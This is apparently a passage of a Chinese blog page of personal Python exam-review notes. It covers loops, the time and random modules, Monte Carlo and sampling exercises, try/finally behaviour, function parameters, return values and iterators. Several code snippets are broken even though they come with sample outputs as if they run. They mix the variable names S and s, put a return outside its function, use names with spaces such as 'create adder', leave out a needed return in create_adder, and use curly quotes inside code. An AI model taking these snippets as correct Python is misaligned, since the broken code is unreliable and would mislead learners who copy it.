class="string">&quot;BIT&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(s,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&quot;I&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">#跳出当前循环，当前循环结束</span></span><br><span class="line"><span class="comment">#BBBBBBBBBBITTTTTTTTTT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">   <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">   <span class="built_in">print</span>(s,end=<span class="string">&quot;&quot;</span>)<span class="comment">#PYHON</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">   <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">   <span class="built_in">print</span>(s,end=<span class="string">&quot;&quot;</span>)<span class="comment">#PY</span></span><br></pre></td></tr></table></figure>

<p>时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(time.time())<span class="comment">#从1970年1月1日到现在的秒数</span></span><br><span class="line">start=time.time()</span><br><span class="line">end=time.time()</span><br><span class="line"><span class="built_in">print</span>(end-start)<span class="comment">#输入这两行代码的时间差</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.strptime(<span class="string">&#x27;2025-04-08 20:12:30&#x27;</span>,<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)<span class="comment">#将字符串转换为时间元组</span></span><br><span class="line"><span class="comment">#time.struct_time(tm_year=2025, tm_mon=4, tm_mday=8, tm_hour=20, tm_min=12, tm_sec=30, tm_wday=2, tm_yday=98, tm_isdst=-1)#将时间元组转换为字符串</span></span><br><span class="line">time.perf_counter()<span class="comment">#返回一个浮点数，表示当前时间的秒数</span></span><br><span class="line">start=time.perf_counter()</span><br><span class="line">end=time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(end-start) <span class="comment">#返回时间差</span></span><br></pre></td></tr></table></figure>

<p>random</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">15</span>)<span class="comment"># 生成随机数种子</span></span><br><span class="line">random.random()<span class="comment"># 生成随机数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.random()</span><br><span class="line">random.random()*<span class="number">100</span><span class="comment"># 生成随机数</span></span><br><span class="line">random.randint(<span class="number">0</span>,<span class="number">100</span>)<span class="comment"># 生成随机整数</span></span><br><span class="line">random.uniform(<span class="number">0</span>,<span class="number">100</span>)<span class="comment"># 生成随机浮点数</span></span><br><span class="line">lis=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">random.choice(lis)</span><br><span class="line">random.shuffle(lis)<span class="comment"># 打乱列表顺序</span></span><br></pre></td></tr></table></figure>

<p>平均身高课堂练习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]  <span class="comment"># 或者使用其他支持中文的字体</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 10000 个身高（单位：cm），假设身高在 150-200 cm 之间，均匀分布</span></span><br><span class="line">population_height = [random.uniform(<span class="number">150</span>, <span class="number">200</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 抽样 1000 次，每次抽取 10 人，计算平均身高</span></span><br><span class="line">average_heights = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    sample = random.sample(population_height, <span class="number">10</span>)</span><br><span class="line">    avg_height = <span class="built_in">sum</span>(sample) / <span class="built_in">len</span>(sample)</span><br><span class="line">    average_heights.append(avg_height)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画直方图</span></span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.hist(average_heights, bins=<span class="number">30</span>, edgecolor=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;1000次抽样的10人平均身高分布&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;平均身高 (cm)&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;频度&quot;</span>)</span><br><span class="line">plt.grid(axis=<span class="string">&#x27;y&#x27;</span>, linestyle=<span class="string">&#x27;--&#x27;</span>, alpha=<span class="number">0.7</span>)</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>蒙特卡洛方法算π课堂练习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">estimate_pi</span>(<span class="params">num_points</span>):</span><br><span class="line">    inside_circle = <span class="number">0</span></span><br><span class="line">    x_in, y_in = [], []</span><br><span class="line">    x_out, y_out = [], []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_points):</span><br><span class="line">        x = random.uniform(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        y = random.uniform(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x**<span class="number">2</span> + y**<span class="number">2</span> &lt;= <span class="number">1</span>:</span><br><span class="line">            inside_circle += <span class="number">1</span></span><br><span class="line">            x_in.append(x)</span><br><span class="line">            y_in.append(y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x_out.append(x)</span><br><span class="line">            y_out.append(y)</span><br><span class="line"></span><br><span class="line">    pi_estimate = (inside_circle / num_points) * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可视化</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">6</span>,<span class="number">6</span>))</span><br><span class="line">    plt.scatter(x_in, y_in, color=<span class="string">&#x27;blue&#x27;</span>, s=<span class="number">1</span>, label=<span class="string">&#x27;Inside Quarter Circle&#x27;</span>)</span><br><span class="line">    plt.scatter(x_out, y_out, color=<span class="string">&#x27;red&#x27;</span>, s=<span class="number">1</span>, label=<span class="string">&#x27;Outside Quarter Circle&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">f&#x27;Estimated π = <span class="subst">&#123;pi_estimate:<span class="number">.6</span>f&#125;</span> (using <span class="subst">&#123;num_points&#125;</span> points)&#x27;</span>)</span><br><span class="line">    plt.legend()</span><br><span class="line">    plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    plt.axis(<span class="string">&quot;square&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pi_estimate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：使用 100000 个随机点估算 π</span></span><br><span class="line">estimated_pi = estimate_pi(<span class="number">100000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Estimated π: <span class="subst">&#123;estimated_pi&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>异常处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num=<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(num**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误，请输入一个整数&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_finally_override</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;try块执行&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;来自try的返回值&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;except块执行&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finally块执行&quot;</span>)</span><br><span class="line"></span><br><span class="line">result = test_finally_override()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终返回值:&quot;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">try块执行</span></span><br><span class="line"><span class="string">finally块执行</span></span><br><span class="line"><span class="string">最终返回值: 来自try的返回值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_finally_override</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;try块执行&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;来自try的返回值&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;except块执行&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finally块执行&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;来自finally的返回值&quot;</span></span><br><span class="line"></span><br><span class="line">result = test_finally_override()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终返回值:&quot;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">try块执行</span></span><br><span class="line"><span class="string">finally块执行</span></span><br><span class="line"><span class="string">最终返回值: 来自finally的返回值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_finally_with_loop</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                 <span class="keyword">break</span> <span class="comment">#尝试提前退出循环</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;循环第<span class="subst">&#123;i&#125;</span>次&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;finally执行(i=<span class="subst">&#123;i&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">test_finally_with_loop()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">循环第0次</span></span><br><span class="line"><span class="string">finally执行(i=0)</span></span><br><span class="line"><span class="string">finally执行(i=1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num=<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(num**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误，请输入一个整数&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;现在是else&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;现在是finally&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">请输入一个整数: 2</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">现在是else</span></span><br><span class="line"><span class="string">现在是finally</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">请输入一个整数: n</span></span><br><span class="line"><span class="string">输入错误，请输入一个整数</span></span><br><span class="line"><span class="string">现在是finally</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="函数和代码复用"><a href="#函数和代码复用" class="headerlink" title="函数和代码复用"></a>函数和代码复用</h1><h3 id="函数的基本使用"><a href="#函数的基本使用" class="headerlink" title="函数的基本使用"></a>函数的基本使用</h3><p>函数的定义：函数是一段代码的表示</p>
<p>函数是一段具有特定功能的、可重用的语句组</p>
<p>函数是一种功能的抽象，表达特定功能</p>
<p>两个作用：降低编程难度和代码复用</p>
<p><em>def</em>  &lt;函数名&gt;(&lt;参数(0个或多个)&gt;) :</p>
<p>&lt;函数体&gt;</p>
<p><em>return</em></p>
<p>&lt;返回值&gt;</p>
<p>函数定义时，所指定的参数是一种占位符</p>
<p>函数定义后，如果不经过调用，不会被执行</p>
<p>函数定义时，参数是输入、函数体是处理、结果是输出（IPO）</p>
<h2 id="函数的调用过程"><a href="#函数的调用过程" class="headerlink" title="函数的调用过程"></a>函数的调用过程</h2><p>调用是运行函数代码的方式</p>
<p>调用时要给出实际参数，实际参数替换定义中的参数，函数调用后得到返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n</span>):<span class="comment">#函数的定义</span></span><br><span class="line">    S=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        S*=i</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line">fact(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2068.png" alt="image.png"></p>
<h2 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h2><p>参数个数：函数可以有参数，也可以没有，但必须保留括号</p>
<p>def &lt;函数名&gt;():</p>
<pre><code>&lt;函数体&gt;
</code></pre>
<p>return &lt;返回值&gt;</p>
<p>def fact():</p>
<pre><code>print(“我也是函数&quot;)
</code></pre>
<h3 id="可选参数传递"><a href="#可选参数传递" class="headerlink" title="可选参数传递"></a>可选参数传递</h3><p>函数定义时可以为某些参数指定默认值，构成可选参数<strong>（可选参数必须在后边，否则在调用时会引起混乱）</strong></p>
<p>def &lt;函数名&gt;(&lt;非可选参数&gt;，&lt;可选参数&gt;):<br>    &lt;函数体&gt;<br>return &lt;返回值&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#计算n!//m</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n,m=<span class="number">1</span></span>):</span><br><span class="line">    S=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        S*=i</span><br><span class="line">    <span class="keyword">return</span> s//m</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fact(<span class="number">10</span>)</span><br><span class="line"><span class="number">3628800</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fact(<span class="number">10</span>,<span class="number">5</span>)</span><br><span class="line"><span class="number">725760</span></span><br></pre></td></tr></table></figure>

<h3 id="可变参数传递"><a href="#可变参数传递" class="headerlink" title="可变参数传递"></a>可变参数传递</h3><p>函数定义时可以设计可变数量参数，既不确定参数总数量</p>
<p>def &lt;函数名&gt;(&lt;参数&gt;, *b):</p>
<pre><code> &lt;函数体&gt;

 return &lt;返回值&gt;
</code></pre>
<p><strong>带星号的参数必须出现在参数列表最后通过元组类型接收多个值(0个也可!)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#计算n!乘数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n,*b</span>):<span class="comment">#b为可变参数</span></span><br><span class="line">    S=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        S*=i</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> b:</span><br><span class="line">        s*= item</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&gt;&gt;&gt;fact(<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">10886400</span></span><br><span class="line">&gt;&gt;&gt;fact(<span class="number">10</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line"><span class="number">435456000</span></span><br></pre></td></tr></table></figure>

<p>参数传递的两种方式：<strong>函数调用时，参数可以按照位置或名称方式传递</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2069.png" alt="image.png"></p>
<p>Python中的可变参数</p>
<p><strong>关键词位置可变参数*args</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>关键词可变参数</strong>kwargs**</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span> info(**kwargs):</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>位置可变、关键词可变组合使用（考试会考）</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">a,b,*args,c=<span class="number">0</span>,**kwargs</span>):<span class="comment">#参数,可变参数,可变位置参数,默认参数,关键词可变参数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a=<span class="subst">&#123;a&#125;</span>,b=<span class="subst">&#123;b&#125;</span>,c=<span class="subst">&#123;c&#125;</span>,args=<span class="subst">&#123;args&#125;</span>,kwargs=<span class="subst">&#123;kwargs&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">a,b=<span class="number">1</span>,*c,**d</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">fact(<span class="number">3</span>,<span class="number">2</span>,<span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span>,name=<span class="string">&#x27;wangdachui&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h2><p>函数可以返回0个或多个结果，return保留字用来传递返回值。</p>
<p>函数可以有返回值，也可以没有，可以有return，也可以没有return可以传递0个返回值，也可以传递任意多个返回值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>),&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;wangdachui&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;fact()</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">&gt;&gt;&gt;fact()[<span class="number">1</span>]</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;fact()[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">&gt;&gt;&gt;fact()</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">&gt;&gt;&gt;a,b,c = fact()</span><br><span class="line">&gt;&gt;&gt;a</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;b</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;c</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n,m=<span class="number">1</span></span>):</span><br><span class="line">    S=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        S*=i</span><br><span class="line"><span class="keyword">return</span> s//m,n,m</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;fact(<span class="number">10</span>,<span class="number">5</span>)</span><br><span class="line">(<span class="number">725760</span>,<span class="number">10</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b,c=fact(<span class="number">10</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a,b,c)</span><br><span class="line"><span class="number">725760</span> <span class="number">10</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p><strong>高阶函数：返回函数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">y</span>):</span><br><span class="line">        <span class="keyword">return</span> x+y</span><br><span class="line">Add5 = create adder(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(add5(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p><strong>提前返回，实现安全验证</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> “<span class="literal">False</span>”</span><br><span class="line">    <span class="keyword">return</span> a/b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count</span> up(n):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">yield</span> i</span><br></pre></td></tr></table></figure>

<p><strong>返回None</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">Return</span><br><span class="line"></span><br><span class="line">Def A:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><strong>注意可变参数的返回</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">append_item</span>(<span class="params">lst=[]</span>):</span><br><span class="line">    lst.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;append_item()</span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">&gt;&gt;&gt;append_item()</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">&gt;&gt;&gt;append_item()</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">&gt;&gt;&gt;append_item()</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Python迭代器"><a href="#Python迭代器" class="headerlink" title="Python迭代器"></a>Python迭代器</h2><p><strong>Map Filter Yield 返回的皆是迭代器</strong></p>
<p>迭代器是一个可以逐个产出元素的对象，迭代器只能往前，不能后退。</p>
<p>符合两个基本方法：iter_()可选代、next_0可不断取下一个值</p>
<p>直到结束，抛出Stoplteration异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">fact</span>():</span><br><span class="line">        <span class="keyword">yield</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">fact1</span>():</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fact()</span><br><span class="line">&lt;generator <span class="built_in">object</span> fact at <span class="number">0x100db6380</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fact1()</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">&gt;&gt;&gt;fact()</span><br><span class="line">&lt;generator <span class="built_in">object</span> fact at <span class="number">0x100db6380</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fact().<span class="built_in">next</span>()</span><br><span class="line">Traceback(most recent call last):File <span class="string">&quot;&lt;stdin&gt;&quot;</span>,line <span class="number">1</span>,<span class="keyword">in</span> &lt;module&gt;AttributeError:<span class="string">&#x27;generator&#x27;</span><span class="built_in">object</span> has no attribute <span class="string">&#x27;next&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">next</span>(fact())</span><br><span class="line">[<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">5</span>，<span class="number">6</span>，<span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lsss =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">iter</span>(lsss)</span><br><span class="line">&lt;list_iterator <span class="built_in">object</span> at <span class="number">0x100efd300</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h2><p>&lt;语句块1&gt;</p>
<p>def &lt;函数名&gt;(&lt;参数&gt;):</p>
<pre><code>   &lt;函数体&gt;

   return&lt;返回值&gt;
</code></pre>
<p>&lt;语句块2&gt;</p>
<p><strong>规则1：局部变量和全局变量是不同变量</strong></p>
<p>局部变量是函数内部的占位符，与全局变量可能重名但不同。函数运算结束后，局部变量被释放。可以使用global保留字在函数内部使用全局变量。</p>
